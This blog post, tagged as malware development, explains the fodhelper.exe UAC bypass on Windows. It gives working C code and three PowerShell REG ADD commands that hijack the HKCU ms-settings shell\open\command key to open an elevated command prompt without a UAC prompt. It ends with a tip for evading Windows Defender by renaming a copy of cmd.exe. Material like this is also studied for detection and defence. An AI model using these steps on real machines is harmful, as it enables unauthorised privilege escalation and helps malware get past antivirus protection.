---
layout: post
title: "UAC bypass using fodhelper"
date: 2024-08-21 09:49:00 +0000
tags: [UAC Bypass,Malware Development, Windows Internals]
# categories: [Windows Internals]
categories: [Malware Development]
---


User Account Control (UAC) is a crucial security feature in Windows designed to prevent unauthorized changes to the operating system. However, vulnerabilities in UAC can be exploited to escalate privileges. One common method for such exploitation involves `fodhelper.exe`. This post will explore how `fodhelper.exe` can be used to bypass UAC and how this technique can be implemented by malware to escalate privileges and defeat Windows defender.

![UAC](/assets/img/UAC_bypass_using_fodhelper/example-uac-prompt.webp)



Before diving into how `fodhelper.exe` can be exploited. it's important to know how basics of this exploitation works. 

## fodhelper.exe

`fodhelper.exe` was introduced in Windows 10 to manage optional features like region-specific keyboard settings. It's located at C:\Windows\System32\fodhelper.exe in the System32 directory. This file is digitally signed by Microsoft, ensuring its authenticity and integrity. 

```xml
c:\windows\system32\fodhelper.exe:
    Verified:       Signed
    Signing date:   4:21 AM 7/4/2024
    Publisher:      Microsoft Windows
    Company:        Microsoft Corporation
    Description:    Features On Demand Helper
    Product:        Microsoft® Windows® Operating System
    Prod version:   10.0.22621.3672
    File version:   10.0.22621.3672 (WinBuild.160101.0800)
    MachineType:    64-bit
    Binary Version: 10.0.22621.3672
    Original Name:  FodHelper.EXE
    Internal Name:  FodHelper
    Copyright:      © Microsoft Corporation. All rights reserved.
    Comments:       n/a
    Entropy:        5.558
    Manifest:
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!-- Copyright (c) Microsoft Corporation -->
<assembly
   xmlns="urn:schemas-microsoft-com:asm.v1"
   xmlns:asmv3="urn:schemas-microsoft-com:asm.v3"
   manifestVersion="1.0">
 <assemblyIdentity type="win32" publicKeyToken="6595b64144ccf1df" name="Microsoft.Windows.FodHelper" version="5.1.0.0" processorArchitecture="amd64"/>
 <description>Features On Demand Helper UI</description>
 <trustInfo xmlns="urn:schemas-microsoft-com:asm.v3">
  <security>
      <requestedPrivileges>
          <requestedExecutionLevel
            level="requireAdministrator"
          />
      </requestedPrivileges>
  </security>
 </trustInfo>
 <asmv3:application>
    <asmv3:windowsSettings xmlns="http://schemas.microsoft.com/SMI/2005/WindowsSettings">
        <dpiAware>true</dpiAware>
        <autoElevate>true</autoElevate>
    </asmv3:windowsSettings>
 </asmv3:application>
</assembly>
```



`fodhelper.exe` is designed to automatically run with elevated privileges because it has the `autoelevate` flag set. This allows it to upgrade its integrity level from Medium to High without requiring a UAC prompt. The `sigcheck` tool shows that the application is intended for administrative users and requires full admin rights. The `autoelevate` feature enables it to achieve these higher privileges without requesting admin approval.


## Understanding the exploitation
Running `fodhelper.exe` and capturing its events with ProcMon shows that it attemps to query a default value for the registry key `HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command`. Additionally, it checks for the `DelegateExecute` value in the same registry path (`HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\command`). 


![fodhelperprocmon](/assets/img/UAC_bypass_using_fodhelper/fodhelperprocmon.png)


### Understanding File Execution Through the Windows Registry

To clearly understand the exploitation, it's important to examine how file execution works. For better clarity, let's use the example of an `.html` file.

When a file is double-clicked in Windows, the system determines which application should open it based on the file's extension (like `.html`, `.txt`, etc.). The information linking file extensions to their respective applications is stored in the Windows Registry, specifically under `HKEY_CLASSES_ROOT`.

- Suppose an `.html` file is opened; the system checks for the `.html` extension under the `.html` key in `HKEY_CLASSES_ROOT` to look for it's [`ProgID`](https://learn.microsoft.com/en-us/windows/win32/shell/fa-progids).

**ProgID:** A Programmatic ID (ProgID) is a string that uniquely identifies a specific version of a COM class, which can be an application or a component. For file associations, a ProgID links a file extension to the application or component that should handle it. The correct structure of a ProgID key name follows the format `[Vendor or Application].[Component].[Version]`, using periods to separate each part, with no spaces in between. An example would be `Word.Document.6`.

For an HTML file, the ProgID is `htmlfile`, which is outlined in red in the screenshot below.


![progID](/assets/img/UAC_bypass_using_fodhelper/ProgID.png)



- Once the ProgID (`htmlfile`) is identified, Windows searches for the corresponding ProgID key under `HKEY_CLASSES_ROOT`.

![searchingProgID](/assets/img/UAC_bypass_using_fodhelper/ProgIDishtmlfile.png)


- Under the ProgID key (`HKEY_CLASSES_ROOT\htmlfile`),There is typically a `shell` subkey that defines actions such as open, edit, and more.

- The `open` action usually has a `command` subkey that specifies the command line used to open the file. This command often points to the executable of the preferred web browser for html file

<!-- *Note:* The `shell\open\command` key is queried by ``fodhelper.exe``.
 -->


- The `command` subkey might have a value like

```c
"C:\Program Files\Internet Explorer\iexplore.exe" "%1" 
```

![command](/assets/img/UAC_bypass_using_fodhelper/Command.png)

- Here, `%1` is a placeholder for the file path. So, when `.html` file is opened, the system will run below command  and the HTML file opens in the browser.

```c
"C:\Program Files\Internet Explorer\iexplore.exe" "C:\path\to\example.html"
```


### Case for fodhelper.exe

In the case of `fodhelper.exe`, the system queries `HKEY_CURRENT_USER\Software\Classes\ms-settings\Shell\Open\Command`. This is because settings under `HKEY_CURRENT_USER\Software\Classes` are specific to the currently logged-in user and can override the system-wide settings. For instance, if a user has set `.html` files to open with a different browser, this preference is saved in this registry path. As a result, system checks this location to see if the user has any custom commands for opening `exe` files. This allows `fodhelper.exe` to execute commands with elevated privileges based on user-specific configurations.



## Exploitation

Now that the exploitation process is understood, let’s take a look at how it is represented in code.

```c
 // Registry path to be created
    LPWSTR subkey = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
    HKEY phkresult;
    DWORD dwDisposition;

    // Create the specified registry key
    if (RegCreateKeyExW(HKEY_CURRENT_USER, subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &phkresult, &dwDisposition) != ERROR_SUCCESS) {
        printf("RegCreateKeyExW failed with error code %x\n", GetLastError());
        return 1;
    }

    printf("The disposition is %x\n", dwDisposition);

  
    LPSTR valueName = "DelegateExecute";
    char values[MAX_PATH] = "cmd.exe";

    // Set the value for the default key
    if (RegSetValueExA(phkresult, NULL, 0, REG_SZ, (const BYTE*)values, lstrlenA(values) + 1) != ERROR_SUCCESS) {
        printf("RegSetValueExA failed with error code %x\n", GetLastError());
        RegCloseKey(phkresult);
        return 1;
    }

    // Set the value for the DelegateExecute key
    if (RegSetValueExA(phkresult, valueName, 0, REG_SZ, NULL, 0) != ERROR_SUCCESS) {
        printf("RegSetValueExA failed with error code %x\n", GetLastError());
        RegCloseKey(phkresult);
        return 1;
    }

    
    RegCloseKey(phkresult);

    
    STARTUPINFO si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    // Create a new process to run fodhelper.exe
    if (!CreateProcessA(NULL, "powershell.exe -c fodhelper.exe", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        printf("CreateProcessA failed with error code %x\n", GetLastError());
        return 1;
    }

   
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

```

If the code looks a bit boring, a simple 3-step PowerShell script can do the same thing.

### Using Powerhsell

As `fodhelper.exe` checks the `HKCU\Software\Classes\ms-settings\Shell\Open\Command` key in the registry, the PowerShell `REG` utility can be used to add this registry key.

```plaintext
PS C:\Users\ACER> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command
The operation completed successfully.
PS C:\Users\ACER>
```

Since `fodhelper.exe` looks for the default value data to be an executable file, setting it to `cmd.exe` will work.


``` plaintext
PS C:\Users\ACER> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
The operation completed successfully.
PS C:\Users\ACER>
```

`fodhelper.exe` also checks for the `DelegateExecute` value in the same registry key. This value can be added with empty data using the following command:

```plaintext
PS C:\Users\ACER> REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /t REG_SZ /d "" /f
The operation completed successfully.
PS C:\Users\ACER>
```

After successfully adding all the necessary registry keys, values, and data, executing `fodhelper.exe` will bypass UAC. Since `cmd.exe` has been set, a Command Prompt with elevated privileges should appear.

![fodhelper.exe](/assets/img/UAC_bypass_using_fodhelper/Executing_fodhelper.png)


![elevated](/assets/img/UAC_bypass_using_fodhelper/elevated_yes.png)



## What's Stopping the Attack?

Windows Defender: Is It Enough?

if the above steps were simply followed then you might find that `Windows Defender` isn't quite celebrating the fact that a `cmd.exe` has been launched with elevated privileges especially without triggering a UAC prompt.

![Defender_trigger](/assets/img/UAC_bypass_using_fodhelper/Defender_threat_block.png)


To keep things under the radar, just make a copy of `cmd.exe` from `C:\Windows\System32` and give it a new name something less obvious. This simple trick can help avoid detection.

{%
  include embed/video.html
  src='./assets/img/UAC_bypass_using_fodhelper/bypass.mp4'
  title='Defender bypass'
  autoplay=true
  loop=true
  muted=true
%}

